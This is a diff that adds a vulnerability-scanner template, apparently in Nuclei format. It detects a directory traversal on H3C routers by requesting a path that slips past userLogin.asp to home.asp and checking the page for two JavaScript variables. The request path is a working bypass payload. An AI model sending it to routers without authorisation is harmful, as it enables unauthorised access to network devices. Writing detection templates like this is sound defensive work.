@@ -1,0 +1,18 @@
+id: poc-yaml-h3c-router-directory-traversal
+info:
+  name: H3C Router Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/userLogin.asp/../actionpolicy_status/../home.asp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "var user_expire_time="
+      - type: word
+        words:
+          - "var cur_page ="
